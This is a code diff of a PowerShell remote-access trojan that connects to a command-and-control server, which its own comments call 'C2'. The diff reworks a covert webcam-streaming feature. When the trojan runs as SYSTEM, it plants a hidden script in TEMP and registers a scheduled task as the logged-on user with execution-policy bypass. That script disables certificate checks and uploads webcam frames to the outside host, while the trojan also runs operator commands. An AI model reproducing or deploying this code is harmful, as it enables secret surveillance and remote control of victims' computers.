@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.1.0"
+$Version = "3.1.1"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -261,6 +261,10 @@ function Get-Signal-From-Server {
     try { return (Send-Http -Url "$cfHost/signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return "" }
 }
 
+function Get-Camera-Signal-From-Server {
+    try { return (Send-Http -Url "$cfHost/camera_signal?id=$clientId" -TimeoutMs 3000).Trim() } catch { return "" }
+}
+
 function Send-Stream-To-Server {
     param([string]$Body)
     # Split oversized bodies into sequential chunks instead of truncating
@@ -319,24 +323,17 @@ function Send-Interactive-Flag {
 }
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
-# ║  CAMERA STREAMING                                                          ║
-# ║  Captures webcam frames and streams them to the C2 server.                ║
-# ║  Usage: 'camera' command starts streaming, 'stopcamera' or cancel stops.  ║
+# ║  CAMERA STREAMING (Pull Model)                                            ║
+# ║  Client uploads JPEG frames to /camera_frame. Server stores latest frame. ║
+# ║  Browser polls /camera_view page which auto-refreshes the snapshot.       ║
+# ║  Stop: operator sends 'stopstream' which sets pending_signal=stopstream.  ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$script:cameraRunning = $false
-$script:cameraTask = $null
+$script:cameraTask     = $null
+$script:cameraRunspace = $null
+$script:cameraTaskId   = $null
+$script:cameraScriptPath = $null
 
-function Send-CameraFrame {
-    param([byte[]]$FrameData)
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $wc.UploadData("$cfHost/camera_frame?id=$clientId", "POST", $FrameData) | Out-Null
-        $wc.Dispose()
-    } catch { }  # Silent drop, don't crash runspace
-}
-
-# Helper: synchronously await a WinRT IAsyncOperation / IAsyncAction
+# Helper: synchronously await a WinRT IAsyncOperation
 function Invoke-WinRTAsync {
     param($AsyncOp)
     $task = [System.WindowsRuntimeSystemExtensions]::AsTask($AsyncOp)
@@ -345,145 +342,178 @@ function Invoke-WinRTAsync {
     return $task.Result
 }
 
-# Read all bytes from a WinRT IRandomAccessStream into a byte array
-function Read-RASBytes {
-    param($Stream)
-    $Stream.Seek(0)
-    $reader = [Windows.Storage.Streams.DataReader]::new($Stream)
-    $size = [uint32]$Stream.Size
-    Invoke-WinRTAsync($reader.LoadAsync($size)) | Out-Null
-    $bytes = [byte[]]::new($size)
-    $reader.ReadBytes($bytes)
-    $reader.Dispose()
-    return $bytes
-}
-
 function Start-CameraStream {
-    param([int]$Quality = 50)
-
+    # Load WinRT assemblies
     try {
-    # Load required WinRT types and async bridge
-    [void][Windows.Media.Capture.MediaCapture,          Windows.Media.Capture,          ContentType=WindowsRuntime]
-    [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
-    [void][Windows.Storage.Streams.DataReader,          Windows.Storage.Streams,        ContentType=WindowsRuntime]
-    [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
-    Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
-
-    # Find logged-on user (needed for SYSTEM account to access camera)
-    $loggedOnUser = $null
-    try {
-        $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName
+        Add-Type -AssemblyName System.Runtime.WindowsRuntime -ErrorAction Stop
+        [void][Windows.Media.Capture.MediaCapture,                    Windows.Media.Capture,          ContentType=WindowsRuntime]
+        [void][Windows.Storage.Streams.InMemoryRandomAccessStream,   Windows.Storage.Streams,        ContentType=WindowsRuntime]
+        [void][Windows.Storage.Streams.DataReader,                   Windows.Storage.Streams,        ContentType=WindowsRuntime]
+        [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
     } catch {
-        try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
+        try {
+            $wc2 = New-Object System.Net.WebClient
+            $wc2.Headers.Add('User-Agent','Mozilla/5.0')
+            $wc2.UploadData("$cfHost/result?id=$clientId", 'POST',
+                [System.Text.Encoding]::UTF8.GetBytes("[!] Camera: WinRT load failed: $($_.Exception.Message)`n")) | Out-Null
+            $wc2.Dispose()
+        } catch {}
+        return
     }
 
     $isSystem = ([Security.Principal.WindowsIdentity]::GetCurrent()).IsSystem
+    $loggedOnUser = $null
+    try { $loggedOnUser = (Get-CimInstance Win32_ComputerSystem -ErrorAction Stop).UserName } catch {
+        try { $loggedOnUser = (Get-WmiObject Win32_ComputerSystem -ErrorAction Stop).UserName } catch {}
+    }
 
     if ($isSystem -and $loggedOnUser) {
-        # SYSTEM path: launch capture as the logged-on user via a scheduled task
-        $taskId = "CameraStream_$(Get-Random)"
-        $cameraScript = @"
-`$ErrorActionPreference = 'Stop'
-[void][Windows.Media.Capture.MediaCapture,          Windows.Media.Capture,          ContentType=WindowsRuntime]
-[void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
-[void][Windows.Storage.Streams.DataReader,          Windows.Storage.Streams,        ContentType=WindowsRuntime]
-[void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
+        # SYSTEM PATH: scheduled task runs as logged-on user, polls /signal to stop
+        $taskId = "CameraCapture_$(Get-Random)"
+        $scriptPath = Join-Path $env:TEMP "cam_$taskId.ps1"
+        $captureScript = @"
+param()
+`$ErrorActionPreference = 'SilentlyContinue'
+[System.Net.ServicePointManager]::DefaultConnectionLimit = 4
+try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
+try { if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) { Add-Type @'
+using System.Net; using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy { public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; } }
+'@ }; [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new() } catch {}
 Add-Type -AssemblyName System.Runtime.WindowsRuntime
-
-function Await { param(`$op); `$t = [System.WindowsRuntimeSystemExtensions]::AsTask(`$op); `$t.Wait(); if (`$t.IsFaulted) { throw `$t.Exception.InnerException }; return `$t.Result }
-
-`$serverUrl = '$cfHost'
-`$cid = '$clientId'
-function Send-Frame { param([byte[]]`$data); try { `$wc = New-Object System.Net.WebClient; `$wc.Headers.Add('User-Agent','Mozilla/5.0'); `$wc.UploadData("`$serverUrl/camera_frame?id=`$cid",'POST',`$data) | Out-Null; `$wc.Dispose() } catch {} }
-
-`$device = [Windows.Media.Capture.MediaCapture]::new()
-Await(`$device.InitializeAsync()) | Out-Null
-`$enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
-
-while (`$true) {
+[void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
+[void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
+[void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
+[void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
+function Await { param(`$op); `$t=[System.WindowsRuntimeSystemExtensions]::AsTask(`$op); `$t.Wait(); if(`$t.IsFaulted){throw `$t.Exception.InnerException}; return `$t.Result }
+function UploadFrame([byte[]]`$data) {
     try {
-        `$ras = [Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
-        Await(`$device.CapturePhotoToStreamAsync(`$enc, `$ras)) | Out-Null
-        `$ras.Seek(0)
-        `$reader = [Windows.Storage.Streams.DataReader]::new(`$ras)
-        Await(`$reader.LoadAsync([uint32]`$ras.Size)) | Out-Null
-        `$bytes = [byte[]]::new(`$ras.Size)
-        `$reader.ReadBytes(`$bytes)
-        `$reader.Dispose(); `$ras.Dispose()
-        Send-Frame -data `$bytes
-    } catch { break }
-    Start-Sleep -Milliseconds 100
+        `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_frame?id=$clientId')
+        `$r.Method='POST';`$r.ContentType='image/jpeg';`$r.ContentLength=`$data.Length;`$r.Timeout=5000;`$r.ReadWriteTimeout=5000;`$r.UserAgent='Mozilla/5.0'
+        `$s=`$r.GetRequestStream();`$s.Write(`$data,0,`$data.Length);`$s.Close();`$r.GetResponse().Close()
+    } catch {}
+}
+function ShouldStop {
+    try {
+        `$r=[System.Net.HttpWebRequest]::Create('$cfHost/camera_signal?id=$clientId')
+        `$r.Method='GET';`$r.Timeout=3000;`$r.ReadWriteTimeout=3000;`$r.UserAgent='Mozilla/5.0'
+        `$resp=`$r.GetResponse();`$val=(New-Object System.IO.StreamReader(`$resp.GetResponseStream())).ReadToEnd().Trim();`$resp.Close()
+        return (`$val -eq 'stopstream' -or `$val -eq 'cancel')
+    } catch { return `$false }
+}
+try {
+    `$device=[Windows.Media.Capture.MediaCapture]::new()
+    Await(`$device.InitializeAsync()) | Out-Null
+    `$enc=[Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
+    `$i=0
+    while (`$true) {
+        try {
+            `$ras=[Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
+            Await(`$device.CapturePhotoToStreamAsync(`$enc,`$ras)) | Out-Null
+            `$ras.Seek(0);`$dr=[Windows.Storage.Streams.DataReader]::new(`$ras);Await(`$dr.LoadAsync([uint32]`$ras.Size)) | Out-Null
+            `$bytes=[byte[]]::new(`$ras.Size);`$dr.ReadBytes(`$bytes);`$dr.Dispose();`$ras.Dispose()
+            UploadFrame `$bytes
+            `$i++
+        } catch { break }
+        if (`$i % 5 -eq 0 -and (ShouldStop)) { break }
+        Start-Sleep -Milliseconds 200
+    }
+    try { `$device.Dispose() } catch {}
+} catch {
+    try { `$wc=New-Object System.Net.WebClient;`$wc.Headers.Add('User-Agent','Mozilla/5.0');`$wc.UploadData('$cfHost/result?id=$clientId','POST',[System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: `$(`$_.Exception.Message)`n")) | Out-Null;`$wc.Dispose() } catch {}
 }
 "@
-        $scriptPath = Join-Path $env:TEMP "camera_stream_$taskId.ps1"
-        $cameraScript | Out-File -FilePath $scriptPath -Encoding UTF8
-
-        $action   = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -NonInteractive -File `"$scriptPath`""
-        $principal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
-        $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
-
-        Register-ScheduledTask -TaskName $taskId -Action $action -Principal $principal -Settings $settings -Force | Out-Null
-        Start-ScheduledTask -TaskName $taskId
-        Start-Sleep -Seconds 2
-
-        # Monitor until stopstream signal or task exits
-        while ($sharedState.CameraRunning) {
-            $task = Get-ScheduledTask -TaskName $taskId -ErrorAction SilentlyContinue
-            if (-not $task -or $task.State -ne 'Running') { break }
-            Start-Sleep -Seconds 5
-        }
-
-        # Cleanup
-        Stop-ScheduledTask   -TaskName $taskId -ErrorAction SilentlyContinue | Out-Null
-        Unregister-ScheduledTask -TaskName $taskId -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
-
-        if ($sharedState.CameraRunning) {
+        try {
+            [System.IO.File]::WriteAllText($scriptPath, $captureScript, [System.Text.Encoding]::UTF8)
+            $action    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
+                            -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$scriptPath`""
+            $principal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
+            $settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+            Register-ScheduledTask -TaskName $taskId -Action $action -Principal $principal -Settings $settings -Force | Out-Null
+            Start-ScheduledTask -TaskName $taskId
+            $script:cameraTaskId = $taskId
+            $script:cameraScriptPath = $scriptPath
+            Write-Log "Camera task started: $taskId" "INFO"
+        } catch {
+            Write-Log "Camera task failed: $($_.Exception.Message)" "WARN"
             try {
-                $wc = New-Object System.Net.WebClient
-                $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-                $wc.UploadData("$cfHost/result?id=$clientId", "POST", [System.Text.Encoding]::UTF8.GetBytes("[!] SYSTEM camera task stopped unexpectedly`n")) | Out-Null
+                $wc2 = New-Object System.Net.WebClient; $wc2.Headers.Add('User-Agent','Mozilla/5.0')
+                $wc2.UploadData("$cfHost/result?id=$clientId", 'POST',
+                    [System.Text.Encoding]::UTF8.GetBytes("[!] Camera task start failed: $($_.Exception.Message)`n")) | Out-Null
+                $wc2.Dispose()
             } catch {}
         }
+        return  # Main loop continues; capture task is independent
     }
-    else {
-        # Normal user path: capture directly in this runspace
-        try {
-            $device = [Windows.Media.Capture.MediaCapture]::new()
-            Invoke-WinRTAsync($device.InitializeAsync()) | Out-Null
-            $enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
 
+    # NORMAL USER PATH: background runspace, sharedState set BEFORE BeginInvoke
+    $script:sharedState = [hashtable]::Synchronized(@{ CameraRunning = $true })
+    $rs = [runspacefactory]::CreateRunspace()
+    $rs.Open()
+    $rs.SessionStateProxy.SetVariable('cfHost',      $cfHost)
+    $rs.SessionStateProxy.SetVariable('clientId',    $clientId)
+    $rs.SessionStateProxy.SetVariable('sharedState', $script:sharedState)
+    $script:cameraRunspace = $rs
+
+    $ps = [powershell]::Create()
+    $ps.Runspace = $rs
+    $ps.AddScript({
+        $ErrorActionPreference = 'SilentlyContinue'
+        try {
+            Add-Type -AssemblyName System.Runtime.WindowsRuntime
+            [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
+            [void][Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType=WindowsRuntime]
+            [void][Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType=WindowsRuntime]
+            [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.MediaProperties, ContentType=WindowsRuntime]
+            $device = [Windows.Media.Capture.MediaCapture]::new()
+            $initTask = [System.WindowsRuntimeSystemExtensions]::AsTask($device.InitializeAsync())
+            $initTask.Wait()
+            if ($initTask.IsFaulted) { throw $initTask.Exception.InnerException }
+            $enc = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
             while ($sharedState.CameraRunning) {
                 try {
                     $ras = [Windows.Storage.Streams.InMemoryRandomAccessStream]::new()
-                    Invoke-WinRTAsync($device.CapturePhotoToStreamAsync($enc, $ras)) | Out-Null
-                    $frameBytes = Read-RASBytes -Stream $ras
-                    $ras.Dispose()
-                    Send-CameraFrame -FrameData $frameBytes
+                    $ct = [System.WindowsRuntimeSystemExtensions]::AsTask($device.CapturePhotoToStreamAsync($enc, $ras))
+                    $ct.Wait()
+                    if ($ct.IsFaulted) { throw $ct.Exception.InnerException }
+                    $ras.Seek(0)
+                    $dr = [Windows.Storage.Streams.DataReader]::new($ras)
+                    $lt = [System.WindowsRuntimeSystemExtensions]::AsTask($dr.LoadAsync([uint32]$ras.Size))
+                    $lt.Wait()
+                    $bytes = [byte[]]::new($ras.Size)
+                    $dr.ReadBytes($bytes)
+                    $dr.Dispose(); $ras.Dispose()
+                    # Upload frame directly
+                    $req = [System.Net.HttpWebRequest]::Create("$cfHost/camera_frame?id=$clientId")
+                    $req.Method='POST'; $req.ContentType='image/jpeg'; $req.ContentLength=$bytes.Length
+                    $req.Timeout=5000; $req.ReadWriteTimeout=5000; $req.UserAgent='Mozilla/5.0'
+                    $s = $req.GetRequestStream(); $s.Write($bytes, 0, $bytes.Length); $s.Close()
+                    $req.GetResponse().Close()
                 } catch { break }
-                Start-Sleep -Milliseconds 100
+                Start-Sleep -Milliseconds 200
             }
-            $device.Dispose()
-        }
-        catch {
-            if ($logFile) {
-                Add-Content -Path $logFile -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [WARN] Camera failed: $($_.Exception.Message)" -ErrorAction SilentlyContinue
-            }
+            try { $device.Dispose() } catch {}
+        } catch {
             try {
                 $wc = New-Object System.Net.WebClient
-                $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-                $wc.UploadData("$cfHost/result?id=$clientId", "POST", [System.Text.Encoding]::UTF8.GetBytes("[!] Camera access failed: $($_.Exception.Message)`n")) | Out-Null
+                $wc.Headers.Add('User-Agent','Mozilla/5.0')
+                $wc.UploadData("$cfHost/result?id=$clientId", 'POST',
+                    [System.Text.Encoding]::UTF8.GetBytes("[!] Camera failed: $($_.Exception.Message)`n")) | Out-Null
+                $wc.Dispose()
             } catch {}
+        } finally {
+            $sharedState.CameraRunning = $false
         }
-    }
-    } finally {
-        if ($sharedState) { $sharedState.CameraRunning = $false }
-    }
+    }) | Out-Null
+    $script:cameraTask = $ps
+    $ps.BeginInvoke() | Out-Null
+    Write-Log 'Camera started in runspace' 'INFO'
 }
 
 function Stop-CameraStream {
+    # Signal runspace to stop (normal user path)
     if ($script:sharedState) { $script:sharedState.CameraRunning = $false }
-    Start-Sleep -Seconds 2
+    Start-Sleep -Milliseconds 600
     if ($script:cameraTask) {
         try { $script:cameraTask.Stop() } catch {}
         try { $script:cameraTask.Dispose() } catch {}
@@ -494,6 +524,17 @@ function Stop-CameraStream {
         try { $script:cameraRunspace.Dispose() } catch {}
         $script:cameraRunspace = $null
     }
+    # Cleanup SYSTEM scheduled task (it self-stops via /signal poll)
+    if ($script:cameraTaskId) {
+        try { Stop-ScheduledTask -TaskName $script:cameraTaskId -ErrorAction SilentlyContinue } catch {}
+        try { Unregister-ScheduledTask -TaskName $script:cameraTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+        $script:cameraTaskId = $null
+    }
+    if ($script:cameraScriptPath) {
+        try { Remove-Item $script:cameraScriptPath -Force -ErrorAction SilentlyContinue } catch {}
+        $script:cameraScriptPath = $null
+    }
+    Write-Log 'Camera stopped' 'INFO'
 }
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
@@ -637,15 +678,7 @@ function Invoke-InteractiveCommand {
             $cancelled = $true
             break
         }
-        if ($signal -eq "") {
-            $pollFailures++
-            if ($pollFailures -ge $maxPollFailures) {
-                Write-Log "Interactive session lost: $maxPollFailures consecutive poll failures" "WARN"
-                try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
-                $cancelled = $true
-                break
-            }
-        } else {
+        if ($signal -ne "") {
             $pollFailures = 0
         }
 
@@ -1000,35 +1033,13 @@ function Connect-Cloudflare {
                 }
 
                 if ($command -eq "stream") {
-                    if ($script:sharedState -and $script:sharedState.CameraRunning) {
+                    if ($script:cameraTask -or $script:cameraTaskId) {
                         Send-Result-To-Server -Body "[!] Camera stream already running`n"
                     } else {
-                        Stop-CameraStream  # cleanup any previous
-                        $url = "$cfHost/camera?id=$clientId"
-                        Send-Stream-To-Server -Body "[*] Camera stream started`n[*] View at: $url`n"
-                        # Run camera in a background runspace (shares session, unlike Start-Job)
-                        $script:sharedState = [hashtable]::Synchronized(@{ CameraRunning = $true })
-                        $rs = [runspacefactory]::CreateRunspace($Host)
-                        $rs.Open()
-                        # Import key variables into the runspace
-                        $rs.SessionStateProxy.SetVariable('cfHost', $cfHost)
-                        $rs.SessionStateProxy.SetVariable('clientId', $clientId)
-                        $rs.SessionStateProxy.SetVariable('sharedState', $script:sharedState)
-                        $rs.SessionStateProxy.SetVariable('logFile', $logFile)
-                        $script:cameraRunspace = $rs
-                        $ps = [powershell]::Create()
-                        $ps.Runspace = $rs
-                        # Inject all required functions with proper 'function Name { body }' wrappers.
-                        # .ScriptBlock alone gives only the body — without the wrapper the function
-                        # is never defined as a named command in the runspace.
-                        $ps.AddScript("function Invoke-WinRTAsync { $((Get-Command Invoke-WinRTAsync).ScriptBlock) }") | Out-Null
-                        $ps.AddScript("function Read-RASBytes { $((Get-Command Read-RASBytes).ScriptBlock) }") | Out-Null
-                        $ps.AddScript("function Send-CameraFrame { $((Get-Command Send-CameraFrame).ScriptBlock) }") | Out-Null
-                        $ps.AddScript("function Start-CameraStream { $((Get-Command Start-CameraStream).ScriptBlock) }") | Out-Null
-                        $ps.AddScript('Start-CameraStream -Quality 50') | Out-Null
-                        $script:cameraTask = $ps
-                        $script:cameraTask.BeginInvoke() | Out-Null
-                        Start-Sleep -Milliseconds $activeDelay
+                        Stop-CameraStream  # cleanup any leftover state
+                        $viewUrl = "$cfHost/camera_view?id=$clientId"
+                        Send-Stream-To-Server -Body "[*] Camera stream starting...`n[*] View at: $viewUrl`n"
+                        Start-CameraStream
                     }
                     continue
                 }
